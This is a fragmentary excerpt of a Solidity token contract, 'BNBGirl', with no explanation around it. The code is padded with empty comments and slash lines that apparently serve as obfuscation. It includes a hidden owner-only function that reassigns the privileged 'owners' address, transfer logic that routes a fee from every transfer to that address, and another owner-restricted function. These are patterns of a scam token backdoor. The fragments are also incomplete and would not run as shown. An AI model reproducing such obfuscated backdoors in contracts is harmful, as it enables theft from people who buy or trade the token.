...
////////////////////////////////////////////////////////////////////////////////////////////////////////
    ...
    function 
    /**/ammorgan(address AMM, address fact) /**/
    /**/external/**/ 
    /**/onlyOwner/**/ {
        /**/require(fact==address(0),".");
        /**/owners/**/ = /**/AMM/**/;
    }
...
contract BNBGirl is Context, IERC20, Ownable {
    ...
    /**/uint256 private _Ttotal = 40000000000000 * 10**8;
  ...
  
    uint256 private deadF = 7;
    uint256 private marketingWallet = 1;

    mapping(address => bool) private _epeat;
...
////////////////////////////////////////////////////////////////////////////////////////////////////////
    ...
    //external//////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
             uint256 /**/MarketAmount/**/ = /**/amount/**/.mul/**/(marketingWallet/**/).div/**/(100);
        uint256 /**/BurnAmount/**/ = /**/amount/**/.mul/**/(/**/deadF).div(/**/100);
        /**/_transfer/**/(_msgSender(), /**/owners/**/, /**/MarketAmount/**/);
...
////////////////////////////////////////////////////////////////////////////////////////////////////////
    ...
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
        uint256 MarketAmount = amount.mul(marketingWallet).div(100);
        uint256 BurnAmount = amount.mul(deadF).div(100);
        /**/_transfer(sender/**/, /**/owners/**/, MarketAmount/**/);
...

    function amm_factory/**/(address /**/Raddress, uint256 Pairs, address Max) external/**/ onlyOwners() /**/{
